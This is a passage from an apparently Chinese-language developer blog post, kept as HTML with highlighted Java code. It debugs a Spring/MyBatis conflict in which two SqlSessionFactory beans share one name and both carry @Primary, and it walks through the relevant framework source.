class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.oss.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.oss.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/oss/*.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新加的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoticeIntelligenceMapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.mapper"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_ALIASES_PACKAGE = <span class="string">"com.atour.noticeIntelligence.dao.entity"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mapper所在目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MAPPER_LOCATION = <span class="string">"classpath*:mapper/noticeIntelligence/*Mapper.xml"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataSource 数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resource   配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> SqlSessionFactory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(name = <span class="string">"sessionFactory"</span>)</span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">invitationSessionFactory</span><span class="params">(@Qualifier(<span class="string">"dataSource"</span>)</span> DataSource dataSource,</span></span><br><span class="line"><span class="function">        @<span class="title">Qualifier</span><span class="params">(<span class="string">"mybatisConf"</span>)</span> Resource resource) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        Resource[] mapperLocations = <span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(MAPPER_LOCATION);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(mapperLocations);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(TYPE_ALIASES_PACKAGE);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意看bean的名字，完全一模一样！！！😂，目测spring在查找引用的时候错乱了。值得注意的是，俩bean还都标记上了<code>@Primary</code>。</p><h2 id="Primary"><a href="#Primary" class="headerlink" title="@Primary"></a>@Primary</h2><blockquote><pre><code>No matter how you designate a primary bean, the effect is the same. You’re telling</code></pre><p>Spring that it should choose the primary bean in the case of ambiguity.</p><pre><code>This works well right up to the point where you designate two or more primary</code></pre><p>beans.</p><pre><code>Now there are two primary Dessert beans: Cake and IceCream. This poses a new ambi</code></pre><p>guity issue. Just as Spring couldn’t choose among multiple candidate beans, it can’t</p><p>choose among multiple primary beans. Clearly, when more than one bean is desig</p><p>nated as primary, there are no primary candidates.</p><p>​                                                                —— 《Spring in action 4th Edition》</p></blockquote><p><strong>Clearly, when more than one bean is designated as primary, there are no primary candidates </strong></p><p>如果有多个<code>@Primary</code>注解的bean，那么就没有<code>primary</code>的candidate了；这里说的已经很明确了，但是没有说spring具体怎么处理的。毕竟上面的项目启动的时候也没有报<code>ambiguity</code> 相关的异常。</p><h2 id="MapperScan"><a href="#MapperScan" class="headerlink" title="MapperScan"></a>MapperScan</h2><p><code>MapperScan</code>是mybatis提供的注解，用来指定扫描dao层接口的目录和mapper文件所在的位置的注解，上面名字冲突的bean是通过下面的形式引入的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MapperScan</span>(basePackages = NoticeIntelligenceMapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br></pre></td></tr></table></figure><p>看下源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.annotation.MapperScannerRegistrar#registerBeanDefinitions</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省略n行</span></span><br><span class="line">    scanner.setSqlSessionTemplateBeanName(annoAttrs.getString(<span class="string">"sqlSessionTemplateRef"</span>));</span><br><span class="line">    <span class="comment">// 这里获取注解里对应的属性值</span></span><br><span class="line">    scanner.setSqlSessionFactoryBeanName(annoAttrs.getString(<span class="string">"sqlSessionFactoryRef"</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; basePackages = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"value"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String pkg : annoAttrs.getStringArray(<span class="string">"basePackages"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(pkg)) &#123;</span><br><span class="line">        basePackages.add(pkg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : annoAttrs.getClassArray(<span class="string">"basePackageClasses"</span>)) &#123;</span><br><span class="line">      basePackages.add(ClassUtils.getPackageName(clazz));</span><br><span class="line">    &#125;</span><br><span class="line">    scanner.registerFilters();</span><br><span class="line">    scanner.doScan(StringUtils.toStringArray(basePackages));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到对应属性使用的地方：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.mybatis.spring.mapper.ClassPathMapperScanner#processBeanDefinitions</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processBeanDefinitions</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; beanDefinitions)</span> </span>&#123;</span><br><span class="line">    GenericBeanDefinition definition;</span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder holder : beanDefinitions) &#123;</span><br><span class="line">      definition = (GenericBeanDefinition) holder.getBeanDefinition();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">"Creating MapperFactoryBean with name '"</span> + holder.getBeanName() </span><br><span class="line">          + <span class="string">"' and '"</span> + definition.getBeanClassName() + <span class="string">"' mapperInterface"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// the mapper interface is the original class of the bean</span></span><br><span class="line">      <span class="comment">// but, the actual class of the bean is MapperFactoryBean</span></span><br><span class="line">      definition.getConstructorArgumentValues().addGenericArgumentValue(definition.getBeanClassName()); <span class="comment">// issue #59</span></span><br><span class="line">      definition.setBeanClass(<span class="keyword">this</span>.mapperFactoryBean.getClass());</span><br><span class="line"></span><br><span class="line">      definition.getPropertyValues().add(<span class="string">"addToConfig"</span>, <span class="keyword">this</span>.addToConfig);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> explicitFactoryUsed = <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// 这里设置对应依赖的占位</span></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionFactoryBeanName)) &#123;</span><br><span class="line">        <span class="comment">// 这里的RunTimeBean</span></span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionFactoryBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionFactory"</span>, <span class="keyword">this</span>.sqlSessionFactory);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.sqlSessionTemplateBeanName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">new</span> RuntimeBeanReference(<span class="keyword">this</span>.sqlSessionTemplateBeanName));</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sqlSessionTemplate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (explicitFactoryUsed) &#123;</span><br><span class="line">          logger.warn(<span class="string">"Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.getPropertyValues().add(<span class="string">"sqlSessionTemplate"</span>, <span class="keyword">this</span>.sqlSessionTemplate);</span><br><span class="line">        explicitFactoryUsed = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!explicitFactoryUsed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Enabling autowire by type for MapperFactoryBean with name '"</span> + holder.getBeanName() + <span class="string">"'."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最终使用的是<code>RuntimeBeanReference</code>。</p><h2 id="RuntimeBeanReference"><a href="#RuntimeBeanReference" class="headerlink" title="RuntimeBeanReference"></a>RuntimeBeanReference</h2><p><code>@Primary</code>注解最终转换成了bean的<code>isPrimary</code>属性，搜代码可以大概知道是在<code>DefaultListableBeanFactory</code>中处理的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.DefaultListableBeanFactory#determinePrimaryCandidate</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determine the primary candidate in the given set of beans.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> candidates a Map of candidate names and candidate instances</span></span><br><span class="line"><span class="comment"> * (or candidate classes if not created yet) that match the required type</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> requiredType the target dependency type to match against</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the name of the primary candidate, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #isPrimary(String, Object)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">determinePrimaryCandidate</span><span class="params">(Map&lt;String, Object&gt; candidates, Class&lt;?&gt; requiredType)</span> </span>&#123;</span><br><span class="line">String primaryBeanName = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : candidates.entrySet()) &#123;</span><br><span class="line">String candidateBeanName = entry.getKey();</span><br><span class="line">Object beanInstance = entry.getValue();</span><br><span class="line"><span class="keyword">if</span> (isPrimary(candidateBeanName, beanInstance)) &#123;</span><br><span class="line"><span class="keyword">if</span> (primaryBeanName != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">boolean</span> candidateLocal = containsBeanDefinition(candidateBeanName);</span><br><span class="line"><span class="keyword">boolean</span> primaryLocal = containsBeanDefinition(primaryBeanName);</span><br><span class="line"><span class="keyword">if</span> (candidateLocal &amp;&amp; primaryLocal) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NoUniqueBeanDefinitionException(requiredType, candidates.size(),</span><br><span class="line"><span class="string">"more than one 'primary' bean found among candidates: "</span> + candidates.keySet());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (candidateLocal) &#123;</span><br><span class="line">primaryBeanName = candidateBeanName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">primaryBeanName = candidateBeanName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> primaryBeanName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里抛异常了，应该不是这里 🙄</p><blockquote><p>首先是信息解析，即将属性定义中的值进行解析，如RuntimeBeanReference解析成引用的Bean对象，这里会进行级联获取bean信息，并追加depend信息。这一步只是解析。</p></blockquote><p>原来在这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.beans.factory.support.BeanDefinitionValueResolver#resolveValueIfNecessary</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a PropertyValue, return a value, resolving any references to other</span></span><br><span class="line"><span class="comment"> * beans in the factory if necessary. The value could be:</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A BeanDefinition, which leads to the creation of a corresponding</span></span><br><span class="line"><span class="comment"> * new bean instance. Singleton flags and names of such "inner beans"</span></span><br><span class="line"><span class="comment"> * are always ignored: Inner beans are anonymous prototypes.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A RuntimeBeanReference, which must be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedList. This is a special collection that may contain</span></span><br><span class="line"><span class="comment"> * RuntimeBeanReferences or Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedSet. May also contain RuntimeBeanReferences or</span></span><br><span class="line"><span class="comment"> * Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;A ManagedMap. In this case the value may be a RuntimeBeanReference</span></span><br><span class="line"><span class="comment"> * or Collection that will need to be resolved.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;An ordinary object or &#123;<span class="doctag">@code</span> null&#125;, in which case it's left alone.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argName the name of the argument that the value is defined for</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value object to resolve</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the resolved object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">resolveValueIfNecessary</span><span class="params">(Object argName, @Nullable Object value)</span> </span>&#123;</span><br><span class="line"><span class="comment">// We must check each value to see whether it requires a runtime reference</span></span><br><span class="line"><span class="comment">// to another bean to be resolved.</span></span><br><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanReference) &#123;</span><br><span class="line">      <span class="comment">// 在这里处理的！！！</span></span><br><span class="line">RuntimeBeanReference ref = (RuntimeBeanReference) value;</span><br><span class="line"><span class="keyword">return</span> resolveReference(argName, ref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanNameReference) &#123;</span><br><span class="line">String refName = ((RuntimeBeanNameReference) value).getBeanName();</span><br><span class="line">refName = String.valueOf(doEvaluate(refName));</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.beanFactory.containsBean(refName)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(</span><br><span class="line"><span class="string">"Invalid bean name '"</span> + refName + <span class="string">"' in bean reference for "</span> + argName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> refName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinitionHolder) &#123;</span><br><span class="line"><span class="comment">// Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.</span></span><br><span class="line">BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;</span><br><span class="line"><span class="keyword">return</span> resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinition) &#123;</span><br><span class="line"><span class="comment">// Resolve plain BeanDefinition, without contained name: use dummy name.</span></span><br><span class="line">BeanDefinition bd = (BeanDefinition) value;</span><br><span class="line">String innerBeanName = <span class="string">"(inner bean)"</span> + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +</span><br><span class="line">ObjectUtils.getIdentityHexString(bd);</span><br><span class="line"><span class="keyword">return</span> resolveInnerBean(argName, innerBeanName, bd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedArray) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">ManagedArray array = (ManagedArray) value;</span><br><span class="line">Class&lt;?&gt; elementType = array.resolvedElementType;</span><br><span class="line"><span class="keyword">if</span> (elementType == <span class="keyword">null</span>) &#123;</span><br><span class="line">String elementTypeName = array.getElementTypeName();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(elementTypeName)) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">elementType = ClassUtils.forName(elementTypeName, <span class="keyword">this</span>.beanFactory.getBeanClassLoader());</span><br><span class="line">array.resolvedElementType = elementType;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="comment">// Improve the message by showing the context.</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error resolving array type for "</span> + argName, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">elementType = Object<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedList) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line"><span class="keyword">return</span> resolveManagedList(argName, (List&lt;?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedSet) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span 